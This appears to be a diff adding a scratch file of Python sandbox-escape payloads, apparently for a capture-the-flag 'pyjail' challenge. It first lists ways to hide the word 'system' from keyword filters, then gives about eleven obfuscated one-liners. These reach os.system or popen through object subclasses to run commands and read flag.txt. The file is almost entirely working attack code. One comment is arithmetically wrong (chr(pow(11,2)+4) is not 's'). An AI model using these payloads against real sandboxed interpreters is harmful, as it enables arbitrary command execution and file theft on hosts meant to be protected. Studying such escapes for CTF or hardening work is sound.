@@ -1,0 +1,54 @@
+1. Unicode/encoding variations:
+python# Unicode normalization
+'sy\u0073tem'
+# Different encodings
+'system'.encode().decode()
+2. Format string tricks:
+python'{}{}{}{}{}{}'.format('s','y','s','t','e','m')
+'%s%s%s%s%s%s' % ('s','y','s','t','e','m')
+f"{'s'}{'y'}{'s'}{'t'}{'e'}{'m'}"
+3. Dictionary/attribute access:
+python# Using exec with globals
+exec('globals()["system"]("whoami")')
+# Using locals/vars if available
+locals()['system']('whoami')
+4. List/tuple manipulation:
+python''.join(['s','y','s','t','e','m'])
+''.join(('s','y','s','t','e','m'))
+5. Mathematical operations:
+python# Using divmod, pow, etc to generate ASCII values
+chr(pow(11,2)+4) # for 's' (115)
+6. Bitwise operations:
+pythonchr(0b1110011) # 's' = 115 in binary
+chr(0o163)     # 's' = 115 in octal
+7. Using eval/exec with encoded payloads:
+pythoneval(bytes([115,121,115,116,101,109]).decode())
+exec(compile('system("whoami")', '<string>', 'eval'))
+8. String methods:
+python'SYSTEM'.lower()
+'system'.upper().lower()
+'  system  '.strip()
+9. Using map/filter functions:
+python''.join(map(chr, [115,121,115,116,101,109]))
+10. ROT13 or custom encoding:
+python'flfgrz'.translate(str.maketrans('abcdefghijklmnopqrstuvwxyz', 'nopqrstuvwxyzabcdefghijklm'))
+Try these approaches! The format string and join methods are particularly effective.
+
+https://www.floyd.ch/?p=584
+
+1 >>> print(().__class__.__bases__[0].__subclasses__()[122]('flag', 'flag.txt').get_data('flag.txt'))
+
+2 >>> print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt', '.').get_data('flag.txt'))
+
+3 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('more flag.txt')
+
+4 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('cat flag.txt')
+5 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__getattribute__(chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
+6 >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73').__getattribute__('\x73\x79\x73\x74\x65\x6d')('cat flag.txt')
+7. >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__getattribute__(chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
+8. >>> ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)](chr(111)+chr(115)).__getattribute__('metsys'[::-1])('more flag.txt')
+9. >>> c=().__class__.__bases__[0].__subclasses__()[153]();o=c._module.__builtins__['nepo'[::-1]];t=o('galf'[::-1]+'.'+'txt');r=t.read();print(r)
+
+10. ().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__getattribute__(chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(116)+chr(121)+chr(112)+chr(101)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
+
+().__class__.__bases__[0].__subclasses__()[153]()._module.__builtins__[chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2](chr(111)+chr(115)).__getattribute__(chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+chr(32)+chr(45)+chr(99)+chr(32)+chr(71)+chr(101)+chr(116)+chr(45)+chr(67)+chr(111)+chr(110)+chr(116)+chr(101)+chr(110)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
